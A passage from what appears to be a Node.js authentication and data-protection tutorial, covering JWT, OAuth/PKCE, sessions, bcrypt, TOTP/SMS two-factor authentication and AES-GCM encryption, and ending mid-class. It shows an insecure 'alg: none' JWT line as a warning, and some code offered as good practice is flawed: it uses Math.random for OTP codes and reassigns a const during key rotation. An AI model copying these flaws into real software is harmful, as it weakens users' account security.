// Example: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

// Header
{
  "alg": "HS256",  // Algorithm
  "typ": "JWT"     // Token type
}

// Payload (Claims)
{
  "sub": "1234567890",           // Subject (user ID)
  "name": "John Doe",            // Custom claim
  "iat": 1516239022,             // Issued at
  "exp": 1516242622,             // Expiration
  "iss": "https://example.com",  // Issuer
  "aud": "https://api.example.com" // Audience
}

// Signature
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  secret
)
```

#### Creating and Verifying JWTs

```javascript
const jwt = require('jsonwebtoken');
const crypto = require('crypto');

// Generate strong secret
const JWT_SECRET = process.env.JWT_SECRET || crypto.randomBytes(64).toString('hex');
const JWT_REFRESH_SECRET = process.env.JWT_REFRESH_SECRET || crypto.randomBytes(64).toString('hex');

// Create access token (short-lived)
function createAccessToken(userId, email) {
  return jwt.sign(
    {
      sub: userId,
      email: email,
      type: 'access'
    },
    JWT_SECRET,
    {
      expiresIn: '15m',  // 15 minutes
      issuer: 'https://example.com',
      audience: 'https://api.example.com'
    }
  );
}

// Create refresh token (long-lived)
function createRefreshToken(userId) {
  return jwt.sign(
    {
      sub: userId,
      type: 'refresh'
    },
    JWT_REFRESH_SECRET,
    {
      expiresIn: '7d',  // 7 days
      issuer: 'https://example.com'
    }
  );
}

// Verify token
function verifyAccessToken(token) {
  try {
    const decoded = jwt.verify(token, JWT_SECRET, {
      issuer: 'https://example.com',
      audience: 'https://api.example.com'
    });
    
    if (decoded.type !== 'access') {
      throw new Error('Invalid token type');
    }
    
    return decoded;
  } catch (error) {
    throw new Error('Invalid token: ' + error.message);
  }
}

function verifyRefreshToken(token) {
  try {
    const decoded = jwt.verify(token, JWT_REFRESH_SECRET, {
      issuer: 'https://example.com'
    });
    
    if (decoded.type !== 'refresh') {
      throw new Error('Invalid token type');
    }
    
    return decoded;
  } catch (error) {
    throw new Error('Invalid refresh token: ' + error.message);
  }
}
```

#### Authentication Flow

```javascript
const express = require('express');
const bcrypt = require('bcrypt');

const app = express();
app.use(express.json());

// Store refresh tokens (use database in production)
const refreshTokens = new Set();

// Login endpoint
app.post('/auth/login', async (req, res) => {
  const { email, password } = req.body;
  
  // Find user (example)
  const user = await db.users.findOne({ email });
  
  if (!user) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  // Verify password
  const validPassword = await bcrypt.compare(password, user.passwordHash);
  
  if (!validPassword) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  // Create tokens
  const accessToken = createAccessToken(user.id, user.email);
  const refreshToken = createRefreshToken(user.id);
  
  // Store refresh token
  refreshTokens.add(refreshToken);
  
  // Send tokens
  res.json({
    accessToken,
    refreshToken,
    expiresIn: 900  // 15 minutes in seconds
  });
});

// Refresh token endpoint
app.post('/auth/refresh', async (req, res) => {
  const { refreshToken } = req.body;
  
  if (!refreshToken) {
    return res.status(401).json({ error: 'Refresh token required' });
  }
  
  // Check if token is in store
  if (!refreshTokens.has(refreshToken)) {
    return res.status(403).json({ error: 'Invalid refresh token' });
  }
  
  try {
    // Verify refresh token
    const decoded = verifyRefreshToken(refreshToken);
    
    // Get user
    const user = await db.users.findById(decoded.sub);
    
    if (!user) {
      return res.status(403).json({ error: 'User not found' });
    }
    
    // Create new access token
    const accessToken = createAccessToken(user.id, user.email);
    
    res.json({
      accessToken,
      expiresIn: 900
    });
  } catch (error) {
    return res.status(403).json({ error: 'Invalid refresh token' });
  }
});

// Logout endpoint
app.post('/auth/logout', (req, res) => {
  const { refreshToken } = req.body;
  
  // Remove refresh token
  refreshTokens.delete(refreshToken);
  
  res.json({ success: true });
});

// Protected route middleware
function authenticateToken(req, res, next) {
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1]; // Bearer TOKEN
  
  if (!token) {
    return res.status(401).json({ error: 'Access token required' });
  }
  
  try {
    const decoded = verifyAccessToken(token);
    req.user = decoded;
    next();
  } catch (error) {
    return res.status(403).json({ error: 'Invalid or expired token' });
  }
}

// Protected route
app.get('/api/profile', authenticateToken, async (req, res) => {
  const user = await db.users.findById(req.user.sub);
  res.json(user);
});
```

#### JWT Best Practices

```javascript
// 1. Keep tokens short-lived
const accessToken = jwt.sign(payload, secret, { expiresIn: '15m' });

// 2. Use different secrets for access and refresh tokens
const ACCESS_SECRET = process.env.JWT_ACCESS_SECRET;
const REFRESH_SECRET = process.env.JWT_REFRESH_SECRET;

// 3. Store minimal data in JWT
const token = jwt.sign(
  {
    sub: userId,  // Only essential data
    role: userRole
    // Don't store: password, SSN, credit cards, etc.
  },
  secret,
  { expiresIn: '15m' }
);

// 4. Validate all claims
const decoded = jwt.verify(token, secret, {
  algorithms: ['HS256'],  // Specify algorithm
  issuer: 'https://example.com',
  audience: 'https://api.example.com',
  clockTolerance: 10  // Allow 10 seconds clock skew
});

// 5. Implement token rotation
app.post('/auth/refresh', async (req, res) => {
  const { refreshToken } = req.body;
  
  // Verify old token
  const decoded = verifyRefreshToken(refreshToken);
  
  // Create new tokens
  const newAccessToken = createAccessToken(decoded.sub);
  const newRefreshToken = createRefreshToken(decoded.sub);
  
  // Invalidate old refresh token
  refreshTokens.delete(refreshToken);
  refreshTokens.add(newRefreshToken);
  
  res.json({
    accessToken: newAccessToken,
    refreshToken: newRefreshToken
  });
});

// 6. Use secure storage
// Store refresh tokens in httpOnly cookies
res.cookie('refreshToken', refreshToken, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  maxAge: 7 * 24 * 60 * 60 * 1000  // 7 days
});

// 7. Implement token blacklist for critical actions
const tokenBlacklist = new Set();

app.post('/auth/logout', authenticateToken, (req, res) => {
  // Add token to blacklist
  tokenBlacklist.add(req.headers.authorization.split(' ')[1]);
  res.json({ success: true });
});

// Check blacklist in middleware
function checkBlacklist(req, res, next) {
  const token = req.headers.authorization?.split(' ')[1];
  
  if (tokenBlacklist.has(token)) {
    return res.status(401).json({ error: 'Token has been revoked' });
  }
  
  next();
}
```

#### JWT Security Considerations

```javascript
// DON'T: Use algorithm 'none'
const badToken = jwt.sign(payload, '', { algorithm: 'none' });

// DO: Specify and validate algorithm
const goodToken = jwt.sign(payload, secret, { algorithm: 'HS256' });

jwt.verify(token, secret, { algorithms: ['HS256'] });

// DON'T: Store sensitive data in JWT
const badPayload = {
  userId: 123,
  password: 'secret123',  // Never!
  ssn: '123-45-6789',     // Never!
  creditCard: '4111...'   // Never!
};

// DO: Store only necessary, non-sensitive data
const goodPayload = {
  sub: userId,
  role: 'user',
  permissions: ['read', 'write']
};

// Protect against timing attacks
function secureCompare(a, b) {
  if (a.length !== b.length) {
    return false;
  }
  
  let result = 0;
  for (let i = 0; i < a.length; i++) {
    result |= a.charCodeAt(i) ^ b.charCodeAt(i);
  }
  
  return result === 0;
}
```

### OAuth 2.0 / OpenID Connect

OAuth 2.0 provides delegated authorization; OpenID Connect adds authentication.

#### OAuth 2.0 Authorization Code Flow

```javascript
const crypto = require('crypto');
const axios = require('axios');

// Configuration
const OAUTH_CONFIG = {
  clientId: process.env.OAUTH_CLIENT_ID,
  clientSecret: process.env.OAUTH_CLIENT_SECRET,
  authorizationUrl: 'https://provider.com/oauth/authorize',
  tokenUrl: 'https://provider.com/oauth/token',
  redirectUri: 'https://myapp.com/auth/callback',
  scope: 'openid profile email'
};

// Step 1: Redirect user to authorization URL
app.get('/auth/login', (req, res) => {
  // Generate state for CSRF protection
  const state = crypto.randomBytes(32).toString('hex');
  
  // Store state in session
  req.session.oauthState = state;
  
  // Generate code verifier for PKCE
  const codeVerifier = crypto.randomBytes(32).toString('base64url');
  req.session.codeVerifier = codeVerifier;
  
  // Generate code challenge
  const codeChallenge = crypto
    .createHash('sha256')
    .update(codeVerifier)
    .digest('base64url');
  
  // Build authorization URL
  const params = new URLSearchParams({
    response_type: 'code',
    client_id: OAUTH_CONFIG.clientId,
    redirect_uri: OAUTH_CONFIG.redirectUri,
    scope: OAUTH_CONFIG.scope,
    state: state,
    code_challenge: codeChallenge,
    code_challenge_method: 'S256'
  });
  
  const authUrl = `${OAUTH_CONFIG.authorizationUrl}?${params}`;
  
  res.redirect(authUrl);
});

// Step 2: Handle callback with authorization code
app.get('/auth/callback', async (req, res) => {
  const { code, state } = req.query;
  
  // Verify state (CSRF protection)
  if (state !== req.session.oauthState) {
    return res.status(403).json({ error: 'Invalid state parameter' });
  }
  
  try {
    // Exchange authorization code for tokens
    const response = await axios.post(
      OAUTH_CONFIG.tokenUrl,
      new URLSearchParams({
        grant_type: 'authorization_code',
        code: code,
        redirect_uri: OAUTH_CONFIG.redirectUri,
        client_id: OAUTH_CONFIG.clientId,
        client_secret: OAUTH_CONFIG.clientSecret,
        code_verifier: req.session.codeVerifier
      }),
      {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded'
        }
      }
    );
    
    const { access_token, refresh_token, id_token } = response.data;
    
    // Verify ID token (OpenID Connect)
    const idTokenPayload = verifyIdToken(id_token);
    
    // Create session
    req.session.userId = idTokenPayload.sub;
    req.session.accessToken = access_token;
    req.session.refreshToken = refresh_token;
    
    // Clean up
    delete req.session.oauthState;
    delete req.session.codeVerifier;
    
    res.redirect('/dashboard');
  } catch (error) {
    console.error('Token exchange failed:', error);
    res.status(500).json({ error: 'Authentication failed' });
  }
});

// Verify ID token (simplified - use library in production)
function verifyIdToken(idToken) {
  const decoded = jwt.verify(idToken, process.env.OAUTH_PUBLIC_KEY, {
    algorithms: ['RS256'],
    issuer: 'https://provider.com',
    audience: OAUTH_CONFIG.clientId
  });
  
  return decoded;
}

// Refresh access token
async function refreshAccessToken(refreshToken) {
  try {
    const response = await axios.post(
      OAUTH_CONFIG.tokenUrl,
      new URLSearchParams({
        grant_type: 'refresh_token',
        refresh_token: refreshToken,
        client_id: OAUTH_CONFIG.clientId,
        client_secret: OAUTH_CONFIG.clientSecret
      }),
      {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded'
        }
      }
    );
    
    return response.data;
  } catch (error) {
    throw new Error('Token refresh failed');
  }
}
```

#### Using Passport.js for OAuth

```javascript
const passport = require('passport');
const GoogleStrategy = require('passport-google-oauth20').Strategy;
const GitHubStrategy = require('passport-github2').Strategy;

// Configure Google OAuth
passport.use(new GoogleStrategy({
    clientID: process.env.GOOGLE_CLIENT_ID,
    clientSecret: process.env.GOOGLE_CLIENT_SECRET,
    callbackURL: '/auth/google/callback'
  },
  async (accessToken, refreshToken, profile, done) => {
    try {
      // Find or create user
      let user = await db.users.findOne({ googleId: profile.id });
      
      if (!user) {
        user = await db.users.create({
          googleId: profile.id,
          email: profile.emails[0].value,
          name: profile.displayName,
          avatar: profile.photos[0].value
        });
      }
      
      return done(null, user);
    } catch (error) {
      return done(error);
    }
  }
));

// Configure GitHub OAuth
passport.use(new GitHubStrategy({
    clientID: process.env.GITHUB_CLIENT_ID,
    clientSecret: process.env.GITHUB_CLIENT_SECRET,
    callbackURL: '/auth/github/callback'
  },
  async (accessToken, refreshToken, profile, done) => {
    try {
      let user = await db.users.findOne({ githubId: profile.id });
      
      if (!user) {
        user = await db.users.create({
          githubId: profile.id,
          username: profile.username,
          email: profile.emails?.[0]?.value,
          avatar: profile.photos?.[0]?.value
        });
      }
      
      return done(null, user);
    } catch (error) {
      return done(error);
    }
  }
));

// Serialize user for session
passport.serializeUser((user, done) => {
  done(null, user.id);
});

// Deserialize user from session
passport.deserializeUser(async (id, done) => {
  try {
    const user = await db.users.findById(id);
    done(null, user);
  } catch (error) {
    done(error);
  }
});

// Routes
app.get('/auth/google',
  passport.authenticate('google', { scope: ['profile', 'email'] })
);

app.get('/auth/google/callback',
  passport.authenticate('google', { failureRedirect: '/login' }),
  (req, res) => {
    res.redirect('/dashboard');
  }
);

app.get('/auth/github',
  passport.authenticate('github', { scope: ['user:email'] })
);

app.get('/auth/github/callback',
  passport.authenticate('github', { failureRedirect: '/login' }),
  (req, res) => {
    res.redirect('/dashboard');
  }
);

// Protected route
app.get('/dashboard',
  (req, res, next) => {
    if (!req.isAuthenticated()) {
      return res.redirect('/login');
    }
    next();
  },
  (req, res) => {
    res.render('dashboard', { user: req.user });
  }
);

// Logout
app.get('/logout', (req, res) => {
  req.logout((err) => {
    if (err) return next(err);
    res.redirect('/');
  });
});
```

### Session Management

Server-side session storage for authentication state.

#### Express Session Configuration

```javascript
const session = require('express-session');
const RedisStore = require('connect-redis').default;
const { createClient } = require('redis');

// Create Redis client
const redisClient = createClient({
  host: process.env.REDIS_HOST || 'localhost',
  port: process.env.REDIS_PORT || 6379,
  password: process.env.REDIS_PASSWORD
});

redisClient.connect().catch(console.error);

// Configure session
app.use(session({
  store: new RedisStore({ client: redisClient }),
  secret: process.env.SESSION_SECRET,
  name: 'sessionId',  // Don't use default 'connect.sid'
  resave: false,
  saveUninitialized: false,
  cookie: {
    secure: true,        // HTTPS only
    httpOnly: true,      // Not accessible via JavaScript
    sameSite: 'strict',  // CSRF protection
    maxAge: 24 * 60 * 60 * 1000,  // 24 hours
    domain: '.example.com'
  },
  rolling: true  // Reset expiration on every response
}));

// Session regeneration on login
app.post('/login', async (req, res) => {
  const { email, password } = req.body;
  
  // Verify credentials
  const user = await authenticateUser(email, password);
  
  if (!user) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  // Regenerate session (prevents session fixation)
  req.session.regenerate((err) => {
    if (err) {
      return res.status(500).json({ error: 'Session error' });
    }
    
    // Store user data in session
    req.session.userId = user.id;
    req.session.role = user.role;
    req.session.loginTime = Date.now();
    
    // Save session
    req.session.save((err) => {
      if (err) {
        return res.status(500).json({ error: 'Session error' });
      }
      
      res.json({ success: true });
    });
  });
});

// Session destruction on logout
app.post('/logout', (req, res) => {
  req.session.destroy((err) => {
    if (err) {
      return res.status(500).json({ error: 'Logout failed' });
    }
    
    res.clearCookie('sessionId');
    res.json({ success: true });
  });
});

// Session validation middleware
function requireAuth(req, res, next) {
  if (!req.session.userId) {
    return res.status(401).json({ error: 'Not authenticated' });
  }
  
  // Check session age
  const sessionAge = Date.now() - req.session.loginTime;
  const maxAge = 24 * 60 * 60 * 1000;  // 24 hours
  
  if (sessionAge > maxAge) {
    req.session.destroy();
    return res.status(401).json({ error: 'Session expired' });
  }
  
  next();
}

// Role-based authorization
function requireRole(role) {
  return (req, res, next) => {
    if (!req.session.userId) {
      return res.status(401).json({ error: 'Not authenticated' });
    }
    
    if (req.session.role !== role) {
      return res.status(403).json({ error: 'Insufficient permissions' });
    }
    
    next();
  };
}

// Usage
app.get('/api/profile', requireAuth, (req, res) => {
  res.json({ userId: req.session.userId });
});

app.get('/admin/users', requireRole('admin'), (req, res) => {
  res.json({ users: [] });
});
```

#### Session Security Best Practices

```javascript
// 1. Implement session timeout
app.use((req, res, next) => {
  if (req.session.lastActivity) {
    const inactive = Date.now() - req.session.lastActivity;
    const timeout = 30 * 60 * 1000;  // 30 minutes
    
    if (inactive > timeout) {
      req.session.destroy();
      return res.status(401).json({ error: 'Session timeout' });
    }
  }
  
  req.session.lastActivity = Date.now();
  next();
});

// 2. Implement concurrent session detection
const userSessions = new Map();

app.post('/login', async (req, res) => {
  const user = await authenticateUser(req.body.email, req.body.password);
  
  // Check for existing sessions
  const existingSessions = userSessions.get(user.id) || [];
  
  // Limit concurrent sessions
  if (existingSessions.length >= 3) {
    // Invalidate oldest session
    const oldestSession = existingSessions[0];
    req.sessionStore.destroy(oldestSession);
    existingSessions.shift();
  }
  
  // Add new session
  existingSessions.push(req.sessionID);
  userSessions.set(user.id, existingSessions);
  
  req.session.userId = user.id;
  res.json({ success: true });
});

// 3. Detect suspicious activity
app.use((req, res, next) => {
  if (req.session.userId) {
    // Check IP change
    if (req.session.ip && req.session.ip !== req.ip) {
      // Log suspicious activity
      console.warn('IP change detected:', {
        userId: req.session.userId,
        oldIp: req.session.ip,
        newIp: req.ip
      });
      
      // Require re-authentication
      req.session.destroy();
      return res.status(401).json({ error: 'Session invalidated' });
    }
    
    req.session.ip = req.ip;
    
    // Check user agent change
    if (req.session.userAgent && req.session.userAgent !== req.get('user-agent')) {
      req.session.destroy();
      return res.status(401).json({ error: 'Session invalidated' });
    }
    
    req.session.userAgent = req.get('user-agent');
  }
  
  next();
});
```

### Password Hashing (bcrypt)

Never store passwords in plain text; use strong hashing algorithms.

#### Basic Password Hashing

```javascript
const bcrypt = require('bcrypt');

// Hash password
async function hashPassword(password) {
  const saltRounds = 12;  // Higher = more secure but slower
  const hash = await bcrypt.hash(password, saltRounds);
  return hash;
}

// Verify password
async function verifyPassword(password, hash) {
  const match = await bcrypt.compare(password, hash);
  return match;
}

// Registration
app.post('/register', async (req, res) => {
  const { email, password } = req.body;
  
  // Validate password strength
  if (!isStrongPassword(password)) {
    return res.status(400).json({ 
      error: 'Password must be at least 8 characters with uppercase, lowercase, number, and special character' 
    });
  }
  
  try {
    // Hash password
    const passwordHash = await hashPassword(password);
    
    // Create user
    const user = await db.users.create({
      email,
      passwordHash
    });
    
    res.json({ success: true, userId: user.id });
  } catch (error) {
    res.status(500).json({ error: 'Registration failed' });
  }
});

// Login
app.post('/login', async (req, res) => {
  const { email, password } = req.body;
  
  try {
    // Find user
    const user = await db.users.findOne({ email });
    
    if (!user) {
      // Don't reveal if user exists
      return res.status(401).json({ error: 'Invalid credentials' });
    }
    
    // Verify password
    const validPassword = await verifyPassword(password, user.passwordHash);
    
    if (!validPassword) {
      return res.status(401).json({ error: 'Invalid credentials' });
    }
    
    // Create session/token
    const token = createAccessToken(user.id, user.email);
    
    res.json({ token });
  } catch (error) {
    res.status(500).json({ error: 'Login failed' });
  }
});
```

#### Password Strength Validation

```javascript
function isStrongPassword(password) {
  // At least 8 characters
  if (password.length < 8) return false;
  
  // At least one uppercase letter
  if (!/[A-Z]/.test(password)) return false;
  
  // At least one lowercase letter
  if (!/[a-z]/.test(password)) return false;
  
  // At least one number
  if (!/[0-9]/.test(password)) return false;
  
  // At least one special character
  if (!/[!@#$%^&*(),.?":{}|<>]/.test(password)) return false;
  
  return true;
}

// Check against common passwords
const commonPasswords = new Set([
  'password', '123456', '12345678', 'qwerty', 'abc123',
  'password1', '111111', '123123', 'admin', 'letmein'
]);

function isCommonPassword(password) {
  return commonPasswords.has(password.toLowerCase());
}

// Full validation
function validatePassword(password) {
  const errors = [];
  
  if (password.length < 8) {
    errors.push('Password must be at least 8 characters');
  }
  
  if (password.length > 128) {
    errors.push('Password must be less than 128 characters');
  }
  
  if (!/[A-Z]/.test(password)) {
    errors.push('Password must contain at least one uppercase letter');
  }
  
  if (!/[a-z]/.test(password)) {
    errors.push('Password must contain at least one lowercase letter');
  }
  
  if (!/[0-9]/.test(password)) {
    errors.push('Password must contain at least one number');
  }
  
  if (!/[!@#$%^&*(),.?":{}|<>]/.test(password)) {
    errors.push('Password must contain at least one special character');
  }
  
  if (isCommonPassword(password)) {
    errors.push('Password is too common');
  }
  
  return {
    valid: errors.length === 0,
    errors
  };
}
```

#### Password Reset Flow

```javascript
const crypto = require('crypto');

// Request password reset
app.post('/password/reset-request', async (req, res) => {
  const { email } = req.body;
  
  // Find user
  const user = await db.users.findOne({ email });
  
  // Don't reveal if user exists
  if (!user) {
    return res.json({ success: true });
  }
  
  // Generate reset token
  const resetToken = crypto.randomBytes(32).toString('hex');
  const resetTokenHash = await bcrypt.hash(resetToken, 10);
  
  // Store token with expiration
  await db.users.updateOne(
    { id: user.id },
    {
      resetTokenHash,
      resetTokenExpiry: Date.now() + 3600000  // 1 hour
    }
  );
  
  // Send email with reset link
  const resetUrl = `https://example.com/password/reset?token=${resetToken}&email=${email}`;
  await sendEmail(email, 'Password Reset', `Click here: ${resetUrl}`);
  
  res.json({ success: true });
});

// Reset password
app.post('/password/reset', async (req, res) => {
  const { email, token, newPassword } = req.body;
  
  // Find user
  const user = await db.users.findOne({ email });
  
  if (!user || !user.resetTokenHash) {
    return res.status(400).json({ error: 'Invalid reset token' });
  }
  
  // Check expiration
  if (Date.now() > user.resetTokenExpiry) {
    return res.status(400).json({ error: 'Reset token expired' });
  }
  
  // Verify token
  const validToken = await bcrypt.compare(token, user.resetTokenHash);
  
  if (!validToken) {
    return res.status(400).json({ error: 'Invalid reset token' });
  }
  
  // Validate new password
  const validation = validatePassword(newPassword);
  if (!validation.valid) {
    return res.status(400).json({ errors: validation.errors });
  }
  
  // Hash new password
  const passwordHash = await hashPassword(newPassword);
  
  // Update password and clear reset token
  await db.users.updateOne(
    { id: user.id },
    {
      passwordHash,
      resetTokenHash: null,
      resetTokenExpiry: null,
      passwordChangedAt: Date.now()
    }
  );
  
  // Invalidate all existing sessions
  await invalidateUserSessions(user.id);
  
  res.json({ success: true });
});
```

### Multi-factor Authentication

Add an extra layer of security beyond passwords.

#### TOTP (Time-based One-Time Password)

```javascript
const speakeasy = require('speakeasy');
const QRCode = require('qrcode');

// Enable 2FA - Generate secret
app.post('/auth/2fa/enable', authenticateToken, async (req, res) => {
  const userId = req.user.sub;
  
  // Generate secret
  const secret = speakeasy.generateSecret({
    name: `MyApp (${req.user.email})`,
    issuer: 'MyApp'
  });
  
  // Store secret temporarily (don't enable yet)
  await db.users.updateOne(
    { id: userId },
    { tempTotpSecret: secret.base32 }
  );
  
  // Generate QR code
  const qrCodeUrl = await QRCode.toDataURL(secret.otpauth_url);
  
  res.json({
    secret: secret.base32,
    qrCode: qrCodeUrl
  });
});

// Verify and activate 2FA
app.post('/auth/2fa/verify', authenticateToken, async (req, res) => {
  const { token } = req.body;
  const userId = req.user.sub;
  
  // Get temp secret
  const user = await db.users.findById(userId);
  
  if (!user.tempTotpSecret) {
    return res.status(400).json({ error: '2FA setup not initiated' });
  }
  
  // Verify token
  const verified = speakeasy.totp.verify({
    secret: user.tempTotpSecret,
    encoding: 'base32',
    token: token,
    window: 2  // Allow 2 time steps before/after
  });
  
  if (!verified) {
    return res.status(400).json({ error: 'Invalid token' });
  }
  
  // Generate backup codes
  const backupCodes = Array.from({ length: 10 }, () =>
    crypto.randomBytes(4).toString('hex')
  );
  
  const backupCodesHash = await Promise.all(
    backupCodes.map(code => bcrypt.hash(code, 10))
  );
  
  // Enable 2FA
  await db.users.updateOne(
    { id: userId },
    {
      totpSecret: user.tempTotpSecret,
      tempTotpSecret: null,
      twoFactorEnabled: true,
      backupCodes: backupCodesHash
    }
  );
  
  res.json({
    success: true,
    backupCodes  // Show once, user must save
  });
});

// Login with 2FA
app.post('/auth/login', async (req, res) => {
  const { email, password, totpToken } = req.body;
  
  // Verify credentials
  const user = await db.users.findOne({ email });
  
  if (!user) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  const validPassword = await bcrypt.compare(password, user.passwordHash);
  
  if (!validPassword) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  // Check if 2FA enabled
  if (user.twoFactorEnabled) {
    if (!totpToken) {
      return res.status(200).json({ 
        requires2FA: true,
        tempToken: createTempToken(user.id)  // Short-lived token for 2FA step
      });
    }
    
    // Verify TOTP
    const verified = speakeasy.totp.verify({
      secret: user.totpSecret,
      encoding: 'base32',
      token: totpToken,
      window: 2
    });
    
    if (!verified) {
      return res.status(401).json({ error: 'Invalid 2FA token' });
    }
  }
  
  // Create session
  const token = createAccessToken(user.id, user.email);
  res.json({ token });
});

// Disable 2FA
app.post('/auth/2fa/disable', authenticateToken, async (req, res) => {
  const { password, totpToken } = req.body;
  const userId = req.user.sub;
  
  // Verify password
  const user = await db.users.findById(userId);
  const validPassword = await bcrypt.compare(password, user.passwordHash);
  
  if (!validPassword) {
    return res.status(401).json({ error: 'Invalid password' });
  }
  
  // Verify TOTP
  const verified = speakeasy.totp.verify({
    secret: user.totpSecret,
    encoding: 'base32',
    token: totpToken,
    window: 2
  });
  
  if (!verified) {
    return res.status(401).json({ error: 'Invalid 2FA token' });
  }
  
  // Disable 2FA
  await db.users.updateOne(
    { id: userId },
    {
      totpSecret: null,
      twoFactorEnabled: false,
      backupCodes: null
    }
  );
  
  res.json({ success: true });
});
```

#### SMS-based 2FA

```javascript
const twilio = require('twilio');

const twilioClient = twilio(
  process.env.TWILIO_ACCOUNT_SID,
  process.env.TWILIO_AUTH_TOKEN
);

// Store verification codes temporarily
const verificationCodes = new Map();

// Send SMS code
app.post('/auth/2fa/sms/send', authenticateToken, async (req, res) => {
  const userId = req.user.sub;
  const user = await db.users.findById(userId);
  
  if (!user.phoneNumber) {
    return res.status(400).json({ error: 'Phone number not configured' });
  }
  
  // Generate 6-digit code
  const code = Math.floor(100000 + Math.random() * 900000).toString();
  
  // Store code with expiration
  verificationCodes.set(userId, {
    code: await bcrypt.hash(code, 10),
    expiry: Date.now() + 300000,  // 5 minutes
    attempts: 0
  });
  
  // Send SMS
  try {
    await twilioClient.messages.create({
      body: `Your verification code is: ${code}`,
      from: process.env.TWILIO_PHONE_NUMBER,
      to: user.phoneNumber
    });
    
    res.json({ success: true });
  } catch (error) {
    console.error('SMS send failed:', error);
    res.status(500).json({ error: 'Failed to send SMS' });
  }
});

// Verify SMS code
app.post('/auth/2fa/sms/verify', authenticateToken, async (req, res) => {
  const { code } = req.body;
  const userId = req.user.sub;
  
  const storedData = verificationCodes.get(userId);
  
  if (!storedData) {
    return res.status(400).json({ error: 'No verification code sent' });
  }
  
  // Check expiration
  if (Date.now() > storedData.expiry) {
    verificationCodes.delete(userId);
    return res.status(400).json({ error: 'Code expired' });
  }
  
  // Check attempts (prevent brute force)
  if (storedData.attempts >= 3) {
    verificationCodes.delete(userId);
    return res.status(429).json({ error: 'Too many attempts' });
  }
  
  // Verify code
  const valid = await bcrypt.compare(code, storedData.code);
  
  if (!valid) {
    storedData.attempts++;
    return res.status(400).json({ error: 'Invalid code' });
  }
  
  // Success
  verificationCodes.delete(userId);
  res.json({ success: true });
});
```

---

## 24.4 Data Protection

Protecting user data is both a security and legal requirement.

### Encryption in Transit and at Rest

Encrypt data during transmission and storage.

#### Encryption in Transit (TLS/HTTPS)

```javascript
const https = require('https');
const fs = require('fs');
const express = require('express');

const app = express();

// Read SSL/TLS certificates
const options = {
  key: fs.readFileSync('/path/to/private-key.pem'),
  cert: fs.readFileSync('/path/to/certificate.pem'),
  ca: fs.readFileSync('/path/to/ca-certificate.pem'),  // If using CA
  
  // Security options
  ciphers: [
    'ECDHE-ECDSA-AES128-GCM-SHA256',
    'ECDHE-RSA-AES128-GCM-SHA256',
    'ECDHE-ECDSA-AES256-GCM-SHA384',
    'ECDHE-RSA-AES256-GCM-SHA384'
  ].join(':'),
  honorCipherOrder: true,
  minVersion: 'TLSv1.2',
  maxVersion: 'TLSv1.3'
};

// Create HTTPS server
https.createServer(options, app).listen(443, () => {
  console.log('HTTPS server running on port 443');
});

// Redirect HTTP to HTTPS
const http = require('http');

http.createServer((req, res) => {
  res.writeHead(301, { 
    'Location': `https://${req.headers.host}${req.url}` 
  });
  res.end();
}).listen(80);

// Security headers
app.use((req, res, next) => {
  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains; preload');
  next();
});
```

#### Encryption at Rest

```javascript
const crypto = require('crypto');

// Encryption configuration
const ENCRYPTION_KEY = Buffer.from(process.env.ENCRYPTION_KEY, 'hex'); // 32 bytes
const ALGORITHM = 'aes-256-gcm';

// Encrypt data
function encrypt(text) {
  // Generate random IV
  const iv = crypto.randomBytes(16);
  
  // Create cipher
  const cipher = crypto.createCipheriv(ALGORITHM, ENCRYPTION_KEY, iv);
  
  // Encrypt
  let encrypted = cipher.update(text, 'utf8', 'hex');
  encrypted += cipher.final('hex');
  
  // Get auth tag
  const authTag = cipher.getAuthTag();
  
  // Return IV + authTag + encrypted data
  return {
    iv: iv.toString('hex'),
    authTag: authTag.toString('hex'),
    encrypted: encrypted
  };
}

// Decrypt data
function decrypt(encryptedData) {
  const { iv, authTag, encrypted } = encryptedData;
  
  // Create decipher
  const decipher = crypto.createDecipheriv(
    ALGORITHM,
    ENCRYPTION_KEY,
    Buffer.from(iv, 'hex')
  );
  
  // Set auth tag
  decipher.setAuthTag(Buffer.from(authTag, 'hex'));
  
  // Decrypt
  let decrypted = decipher.update(encrypted, 'hex', 'utf8');
  decrypted += decipher.final('utf8');
  
  return decrypted;
}

// Usage with database
class SecureUserModel {
  async createUser(data) {
    // Encrypt sensitive fields
    const encryptedSSN = encrypt(data.ssn);
    const encryptedCreditCard = encrypt(data.creditCard);
    
    return await db.users.create({
      name: data.name,
      email: data.email,
      ssn: JSON.stringify(encryptedSSN),
      creditCard: JSON.stringify(encryptedCreditCard)
    });
  }
  
  async getUser(id) {
    const user = await db.users.findById(id);
    
    // Decrypt sensitive fields
    return {
      ...user,
      ssn: decrypt(JSON.parse(user.ssn)),
      creditCard: decrypt(JSON.parse(user.creditCard))
    };
  }
}

// Key rotation
async function rotateEncryptionKey() {
  const newKey = crypto.randomBytes(32);
  
  // Re-encrypt all sensitive data with new key
  const users = await db.users.find({});
  
  for (const user of users) {
    // Decrypt with old key
    const oldData = decrypt(JSON.parse(user.ssn));
    
    // Switch to new key
    const oldKey = ENCRYPTION_KEY;
    ENCRYPTION_KEY = newKey;
    
    // Encrypt with new key
    const newData = encrypt(oldData);
    
    // Update database
    await db.users.updateOne(
      { id: user.id },
      { ssn: JSON.stringify(newData) }
    );
  }
  
  // Store new key securely
  process.env.ENCRYPTION_KEY = newKey.toString('hex');
}
```

#### Field-level Encryption

```javascript
class EncryptedField {
  constructor(key) {
    this.key = Buffer.from(key, 'hex');
  }
  
  encrypt(value) {
    if (!value) return null;
    
    const iv = crypto.randomBytes(16);
